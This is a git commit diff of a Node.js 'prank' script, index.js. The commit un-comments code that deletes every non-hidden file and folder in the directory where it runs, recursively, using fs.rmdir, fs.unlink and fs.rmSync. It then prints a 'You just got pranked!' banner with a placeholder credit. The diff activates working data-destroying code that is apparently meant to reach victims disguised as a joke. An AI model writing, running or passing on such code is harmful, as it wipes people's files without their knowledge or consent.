5634f8df604f06f65db4000ec458c21b1392f0e9
Shubham <shubhampatilsd@gmail.com>
2022-04-20 11:42:48 -0700

    done

--- index.js
+++ index.js
@@ -17,22 +17,19 @@ fs.readdir(process.cwd(), async (err, files) => {
   files = files.filter((item) => !/(^|\/)\.[^\/\.]/g.test(item));
   for (const file of files) {
     const path_string = path.join(process.cwd(), file);
-    // if (fs.lstatSync(path_string).isDirectory()) {
-    //   fs.rmdir(path_string, { recursive: true }, (err) => {
-    //     if (err) throw err;
-    //   });
-    // } else {
-    //   fs.unlink(path_string, (err) => {
-    //     if (err) throw err;
-    //   });
-    // }
-    // fs.rmSync(path_string, { recursive: true });
+    if (fs.lstatSync(path_string).isDirectory()) {
+      fs.rmdir(path_string, { recursive: true }, (err) => {
+        if (err) throw err;
+      });
+    } else {
+      fs.unlink(path_string, (err) => {
+        if (err) throw err;
+      });
+    }
+    fs.rmSync(path_string, { recursive: true });
   }
-  // const badLBozoRatio = await figlet("You just got pranked!");
-  // console.log(badLBozoRatio);
-  // chalkAnimation.rainbow(figlet("You just got pranked!"));
   figlet("You just got pranked!", (err, data) => {
     console.log(gradient.pastel.multiline(data));
-    console.log("By me");
+    console.log("By INSERT URL HERE");
   });
 });
